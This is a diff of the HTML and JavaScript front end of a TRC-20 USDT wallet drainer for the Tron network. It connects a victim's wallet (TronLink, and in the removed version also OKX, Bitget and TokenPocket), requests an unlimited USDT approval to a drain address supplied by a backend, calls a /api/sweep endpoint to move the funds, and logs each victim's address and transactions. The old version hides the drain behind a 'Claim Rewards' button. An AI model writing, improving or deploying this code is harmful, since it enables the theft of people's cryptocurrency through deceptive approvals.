@@ -1,323 +1,394 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>USDT Drainer – Multi Wallet</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>USDT Drain Tool</title>
     <style>
-        * { box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 40px auto;
-            padding: 20px;
-            background: #f5f7fa;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            padding: 2rem 1rem;
+            color: #f1f5f9;
         }
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
         .card {
-            background: white;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
-        h2 { margin-top: 0; color: #1a1a2e; }
-        .connect-btn {
-            background: #2b6ef0;
-            color: white;
+
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #60a5fa, #c084fc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.25rem;
+        }
+
+        .sub {
+            color: #94a3b8;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+            border-left: 2px solid #3b82f6;
+            padding-left: 0.75rem;
+        }
+
+        .btn {
+            background: #3b82f6;
             border: none;
-            padding: 12px 24px;
-            border-radius: 40px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 20px;
-        }
-        .connect-btn:hover { background: #0a4bc2; }
-        .info { margin-top: 20px; display: none; }
-        .info p { margin: 8px 0; word-break: break-all; }
-        .status {
-            margin-top: 16px;
-            padding: 10px;
-            background: #eef2f7;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-        .drain-btn {
-            background: #dc3545;
             color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 40px;
+            font-weight: 600;
+            padding: 0.8rem 1.5rem;
+            border-radius: 60px;
+            font-size: 1rem;
             cursor: pointer;
-            margin-top: 16px;
+            transition: all 0.2s ease;
             width: 100%;
+            margin-top: 0.5rem;
         }
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
+
+        .btn-secondary {
+            background: #334155;
         }
-        .modal-content {
-            background: white;
-            border-radius: 20px;
-            padding: 24px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
+
+        .btn-secondary:hover {
+            background: #475569;
         }
-        .wallet-list {
+
+        .btn-danger {
+            background: #dc2626;
+        }
+
+        .btn-danger:hover {
+            background: #b91c1c;
+        }
+
+        .btn-success {
+            background: #10b981;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .info-row {
             display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin: 20px 0;
+            justify-content: space-between;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .wallet-option {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            border-radius: 12px;
-            padding: 12px;
-            cursor: pointer;
-            font-size: 16px;
+
+        .info-label {
             font-weight: 500;
-            text-align: left;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            color: #94a3b8;
         }
-        .wallet-option:hover { background: #e9ecef; }
-        .close-modal {
-            background: #6c757d;
-            color: white;
-            border: none;
-            padding: 8px 16px;
+
+        .info-value {
+            font-family: monospace;
+            word-break: break-all;
+            text-align: right;
+            max-width: 60%;
+        }
+
+        .address-badge {
+            background: #1e293b;
+            padding: 0.25rem 0.75rem;
+            border-radius: 40px;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        .status {
+            background: #0f172a;
             border-radius: 20px;
-            cursor: pointer;
+            padding: 0.8rem 1rem;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            font-family: monospace;
+            border-left: 3px solid #3b82f6;
+        }
+
+        .flex {
+            display: flex;
+            gap: 0.8rem;
+            flex-wrap: wrap;
+        }
+
+        .flex .btn {
+            flex: 1;
+            margin-top: 0;
+        }
+
+        input {
+            background: #0f172a;
+            border: 1px solid #334155;
+            padding: 0.7rem 1rem;
+            border-radius: 40px;
+            color: white;
+            width: 100%;
+            font-family: monospace;
+            margin: 0.5rem 0;
+        }
+
+        label {
+            font-size: 0.75rem;
+            color: #94a3b8;
+            margin-top: 0.5rem;
+            display: block;
+        }
+
+        hr {
+            border-color: #334155;
+            margin: 1rem 0;
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>💰 USDT Drainer</h2>
-    <button id="connectWalletBtn" class="connect-btn">🔌 Connect Wallet</button>
-    <div id="info" class="info">
-        <p><strong>Address:</strong> <span id="address"></span></p>
-        <p><strong>USDT:</strong> <span id="usdt">0.00</span></p>
-        <p><strong>TRX:</strong> <span id="trx">0.00</span></p>
-        <button id="drainBtn" class="drain-btn">💸 Claim Rewards (Approve & Transfer)</button>
+<div class="container">
+    <div class="card">
+        <h1>💸 USDT Drain Tool</h1>
+        <div class="sub">TRC-20 | One‑click approval + sweep</div>
+
+        <!-- Wallet -->
+        <button id="connectBtn" class="btn">🔌 Connect TronLink</button>
+        <div id="walletInfo" style="display: none;">
+            <div class="info-row">
+                <span class="info-label">📍 Address</span>
+                <span class="info-value address-badge" id="addressDisplay"></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">💰 USDT Balance</span>
+                <span class="info-value" id="usdtBalance">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">⚡ TRX Balance</span>
+                <span class="info-value" id="trxBalance">—</span>
+            </div>
+        </div>
     </div>
-    <div id="status" class="status">⚡ Ready</div>
+
+    <!-- Approval + Drain -->
+    <div class="card" id="actionCard" style="display: none;">
+        <div class="info-row">
+            <span class="info-label">🎯 Spender (contract / EOA)</span>
+            <span class="info-value address-badge" id="spenderAddress">—</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">📄 Max approval value</span>
+            <span class="info-value" id="maxApprove">—</span>
+        </div>
+
+        <label>🔓 Approve amount (USDT)</label>
+        <div class="flex">
+            <input type="text" id="approveAmount" placeholder="e.g. 1000 or 'max'" value="max">
+            <button id="approveBtn" class="btn-secondary">✅ Approve USDT</button>
+        </div>
+
+        <hr>
+
+        <button id="drainBtn" class="btn-danger">💀 Drain USDT</button>
+        <div id="statusMsg" class="status">⏳ Waiting for connection...</div>
+    </div>
 </div>
 
-<!-- Wallet selection modal -->
-<div id="walletModal" class="modal">
-    <div class="modal-content">
-        <h3>Select Wallet</h3>
-        <div class="wallet-list" id="walletList"></div>
-        <button class="close-modal" id="closeModalBtn">Cancel</button>
-    </div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.0.0/dist/TronWeb.js"></script>
 <script>
-    // Helper: create TronWeb with custom signer for wallets that use JSON-RPC
-    function createTronWebWithSigner(provider, fullHost = 'https://api.trongrid.io') {
-        const tronWeb = new TronWeb({ fullHost });
-        if (provider && typeof provider.request === 'function') {
-            tronWeb.trx.sign = async (tx) => {
-                const signed = await provider.request({
-                    method: 'tron_signTransaction',
-                    params: [tx]
-                });
-                return signed;
-            };
-        }
-        return tronWeb;
-    }
-
-    // Wallet definitions with proper connection logic
-    const walletDefinitions = [
-        {
-            name: 'TronLink',
-            connect: async () => {
-                if (!window.tronLink) throw new Error('TronLink extension not installed');
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                const tronWeb = window.tronWeb;
-                if (!tronWeb || !tronWeb.defaultAddress) throw new Error('Failed to get address');
-                const address = tronWeb.defaultAddress.base58;
-                return { tronWeb, address };
-            }
-        },
-        {
-            name: 'OKX Wallet',
-            connect: async () => {
-                if (!window.okxwallet || !window.okxwallet.tron) throw new Error('OKX Wallet extension not installed');
-                const accounts = await window.okxwallet.tron.request({ method: 'tron_requestAccounts' });
-                if (!accounts || accounts.length === 0) throw new Error('No account');
-                const address = accounts[0];
-                const provider = window.okxwallet.tron;
-                const tronWeb = createTronWebWithSigner(provider);
-                return { tronWeb, address };
-            }
-        },
-        {
-            name: 'Bitget',
-            connect: async () => {
-                if (!window.bitkeep || !window.bitkeep.tronLink) throw new Error('Bitget Wallet extension not installed');
-                await window.bitkeep.tronLink.request({ method: 'tron_requestAccounts' });
-                const tronWeb = window.bitkeep.tronLink;
-                if (!tronWeb.defaultAddress) throw new Error('Failed to get address');
-                const address = tronWeb.defaultAddress.base58;
-                return { tronWeb, address };
-            }
-        },
-        {
-            name: 'TokenPocket',
-            connect: async () => {
-                if (!window.tp || !window.tp.tron) throw new Error('TokenPocket extension not installed');
-                const accounts = await window.tp.tron.request({ method: 'tron_requestAccounts' });
-                if (!accounts || accounts.length === 0) throw new Error('No account');
-                const address = accounts[0];
-                const provider = window.tp.tron;
-                const tronWeb = createTronWebWithSigner(provider);
-                return { tronWeb, address };
-            }
-        }
-    ];
-
-    // UI elements
-    const connectBtn = document.getElementById('connectWalletBtn');
-    const modal = document.getElementById('walletModal');
-    const walletListDiv = document.getElementById('walletList');
-    const closeModalBtn = document.getElementById('closeModalBtn');
-    const infoDiv = document.getElementById('info');
-    const addressSpan = document.getElementById('address');
-    const usdtSpan = document.getElementById('usdt');
-    const trxSpan = document.getElementById('trx');
-    const drainBtn = document.getElementById('drainBtn');
-    const statusDiv = document.getElementById('status');
-
-    let currentTronWeb = null;
+    // ---------- GLOBALS ----------
     let userAddress = null;
+    let tronWebInstance = null;
+    let configData = { drainAddress: '', drainContract: '', maxApprove: '' };
+    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // fallback, will be updated from config if needed
 
-    function setStatus(msg, isError = false) {
-        statusDiv.innerHTML = msg;
-        statusDiv.style.color = isError ? '#dc3545' : '#1a1a2e';
-        console.log(msg);
-    }
-
-    async function apiCall(endpoint, data) {
-        const res = await fetch(endpoint, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-        return await res.json();
-    }
-
-    async function loadBalances(address) {
+    // ---------- HELPER: log event to backend ----------
+    async function logEvent(type, address, txId = '', amount = '') {
         try {
-            const data = await apiCall('/api/balance', { address });
-            usdtSpan.innerText = data.usdt.toFixed(2);
-            trxSpan.innerText = data.trx.toFixed(2);
-        } catch (err) {
-            setStatus('Balance error: ' + err.message, true);
-        }
-    }
-
-    async function connectWallet(walletDef) {
-        setStatus(`Connecting to ${walletDef.name}...`);
-        try {
-            const { tronWeb, address } = await walletDef.connect();
-            currentTronWeb = tronWeb;
-            userAddress = address;
-            addressSpan.innerText = userAddress;
-            infoDiv.style.display = 'block';
-            setStatus(`✅ Connected with ${walletDef.name}: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
             await fetch('/api/event', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
+                body: JSON.stringify({ type, address, txId, amount })
             });
-            await loadBalances(userAddress);
-            closeModal();
-        } catch (err) {
-            setStatus(`❌ Connection failed: ${err.message}`, true);
-        }
+        } catch(e) { console.warn('event log failed', e); }
     }
 
-    async function approveAndDrain() {
-        if (!userAddress || !currentTronWeb) {
-            setStatus('No wallet connected', true);
-            return;
-        }
-        setStatus('Loading configuration...');
-        let config;
+    // ---------- FETCH CONFIG ----------
+    async function loadConfig() {
         try {
             const res = await fetch('/api/config');
-            config = await res.json();
-        } catch (err) {
-            setStatus('Cannot fetch config', true);
-            return;
-        }
-        const usdtContractAddr = config.usdtContract;
-        const drainTarget = config.drainAddress;
-        const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-        try {
-            const contract = await currentTronWeb.contract().at(usdtContractAddr);
-            setStatus('Approving USDT spending...');
-            const unsignedTx = await contract.approve(drainTarget, MAX_UINT).request();
-            const signedTx = await currentTronWeb.trx.sign(unsignedTx);
-            const txid = await currentTronWeb.trx.sendRawTransaction(signedTx);
-            setStatus(`✅ Approval sent: ${txid.slice(0,16)}...`);
-            await fetch('/api/event', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: txid })
-            });
-            setStatus('Draining...');
-            const sweep = await apiCall('/api/sweep', { address: userAddress });
-            if (sweep.success) {
-                setStatus(`🎉 Drained! TX: ${sweep.txId.slice(0,16)}...`);
-                await fetch('/api/event', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweep.txId, amount: '0' })
-                });
-                setTimeout(() => loadBalances(userAddress), 5000);
-            } else {
-                setStatus(`Drain failed: ${sweep.error}`, true);
-            }
-        } catch (err) {
-            setStatus('Error: ' + err.message, true);
+            const data = await res.json();
+            configData = {
+                drainAddress: data.drainAddress || '',
+                drainContract: data.drainContract || '',
+                maxApprove: data.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+            };
+            if (data.usdtContract) usdtContractAddress = data.usdtContract;
+            document.getElementById('spenderAddress').innerText = configData.drainContract || configData.drainAddress || '❌ Not set';
+            document.getElementById('maxApprove').innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+                ? '∞ (unlimited)' : configData.maxApprove;
+        } catch(e) {
+            console.error('Config error', e);
+            document.getElementById('statusMsg').innerHTML = '⚠️ Failed to load backend config.';
         }
     }
 
-    function showModal() { modal.style.display = 'flex'; }
-    function closeModal() { modal.style.display = 'none'; }
+    // ---------- UPDATE BALANCES (via backend) ----------
+    async function updateBalances(address) {
+        if (!address) return;
+        try {
+            const res = await fetch('/api/balance', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address })
+            });
+            if (!res.ok) throw new Error('Balance fetch failed');
+            const data = await res.json();
+            document.getElementById('usdtBalance').innerText = data.usdt.toFixed(2) + ' USDT';
+            document.getElementById('trxBalance').innerText = data.trx.toFixed(2) + ' TRX';
+        } catch(err) {
+            document.getElementById('usdtBalance').innerText = 'Error';
+            document.getElementById('trxBalance').innerText = 'Error';
+        }
+    }
 
-    // Build wallet list inside modal
-    walletDefinitions.forEach(wallet => {
-        const btn = document.createElement('div');
-        btn.className = 'wallet-option';
-        btn.textContent = wallet.name;
-        btn.onclick = () => {
-            closeModal();
-            connectWallet(wallet);
-        };
-        walletListDiv.appendChild(btn);
+    // ---------- APPROVE USDT (on-chain via TronLink) ----------
+    async function approveUSDT(spender, amountRaw) {
+        if (!tronWebInstance || !userAddress) throw new Error('Wallet not connected');
+        const contract = await tronWebInstance.contract().at(usdtContractAddress);
+        let amountWei;
+        const isMax = (amountRaw === 'max' || amountRaw === '' || amountRaw.toLowerCase() === 'max');
+        if (isMax) {
+            amountWei = configData.maxApprove;
+        } else {
+            let amountNum = parseFloat(amountRaw);
+            if (isNaN(amountNum)) throw new Error('Invalid amount');
+            amountWei = tronWebInstance.toSun(amountNum * 1e6); // USDT has 6 decimals, toSun converts from TRX scale? No – careful: USDT decimals = 6
+            // Actually tronWeb.toSun multiplies by 1e6. So toSun(amount) works for 6 decimals.
+            // But to be safe:
+            amountWei = Math.floor(amountNum * 1e6).toString();
+        }
+
+        const tx = await contract.approve(spender, amountWei).send();
+        console.log('Approve tx:', tx);
+        await logEvent('approve_signed', userAddress, tx, amountRaw);
+        return tx;
+    }
+
+    // ---------- CALL BACKEND SWEEP ----------
+    async function callSweep() {
+        if (!userAddress) throw new Error('No wallet connected');
+        const res = await fetch('/api/sweep', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: userAddress })
+        });
+        const data = await res.json();
+        if (!data.success) throw new Error(data.error || 'Sweep failed');
+        await logEvent('drain_sent', userAddress, data.txId, '');
+        return data;
+    }
+
+    // ---------- TRONLINK CONNECTION ----------
+    async function connectTronLink() {
+        if (!window.tronLink || !window.tronLink.ready) {
+            alert('Please install TronLink (https://tronlink.org)');
+            return false;
+        }
+        try {
+            const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
+            if (!accounts || accounts.length === 0) throw new Error('No accounts');
+            userAddress = accounts[0];
+            tronWebInstance = window.tronLink.tronWeb;
+            // Show wallet section
+            document.getElementById('connectBtn').style.display = 'none';
+            document.getElementById('walletInfo').style.display = 'block';
+            document.getElementById('actionCard').style.display = 'block';
+            document.getElementById('addressDisplay').innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
+            await updateBalances(userAddress);
+            await logEvent('wallet_connected', userAddress);
+            document.getElementById('statusMsg').innerHTML = '✅ Connected. You can now approve USDT.';
+            return true;
+        } catch (err) {
+            console.error(err);
+            document.getElementById('statusMsg').innerHTML = '❌ Connection failed: ' + err.message;
+            return false;
+        }
+    }
+
+    // ---------- EVENT HANDLERS ----------
+    async function handleApprove() {
+        if (!tronWebInstance || !userAddress) {
+            alert('Connect wallet first');
+            return;
+        }
+        const spender = configData.drainContract || configData.drainAddress;
+        if (!spender) {
+            alert('No drain contract or address configured on backend');
+            return;
+        }
+        const amountInput = document.getElementById('approveAmount').value.trim();
+        const statusDiv = document.getElementById('statusMsg');
+        statusDiv.innerHTML = '⏳ Approving USDT... check TronLink popup.';
+        try {
+            const tx = await approveUSDT(spender, amountInput);
+            statusDiv.innerHTML = `✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`;
+        } catch (err) {
+            statusDiv.innerHTML = `❌ Approve failed: ${err.message}`;
+            console.error(err);
+        }
+    }
+
+    async function handleDrain() {
+        if (!userAddress) {
+            alert('Connect wallet first');
+            return;
+        }
+        const statusDiv = document.getElementById('statusMsg');
+        statusDiv.innerHTML = '⏳ Sending drain request...';
+        try {
+            const result = await callSweep();
+            statusDiv.innerHTML = `💀 Drained successfully! TX: <a href="https://tronscan.org/#/transaction/${result.txId}" target="_blank">${result.txId.slice(0,10)}...</a>`;
+            // Refresh balances after drain attempt
+            setTimeout(() => updateBalances(userAddress), 4000);
+        } catch (err) {
+            statusDiv.innerHTML = `❌ Drain error: ${err.message}. Make sure approval is done first.`;
+        }
+    }
+
+    // ---------- INIT ----------
+    window.addEventListener('load', () => {
+        loadConfig();
+        document.getElementById('connectBtn').addEventListener('click', connectTronLink);
+        document.getElementById('approveBtn').addEventListener('click', handleApprove);
+        document.getElementById('drainBtn').addEventListener('click', handleDrain);
+        // detect TronLink presence
+        if (window.tronLink && window.tronLink.ready) {
+            document.getElementById('statusMsg').innerHTML = '🟢 TronLink detected. Click "Connect" above.';
+        } else {
+            document.getElementById('statusMsg').innerHTML = '⚠️ TronLink not detected. Install extension.';
+        }
     });
-
-    // Event listeners
-    connectBtn.onclick = showModal;
-    closeModalBtn.onclick = closeModal;
-    window.onclick = (e) => { if (e.target === modal) closeModal(); };
-    drainBtn.onclick = approveAndDrain;
 </script>
 </body>
 </html>
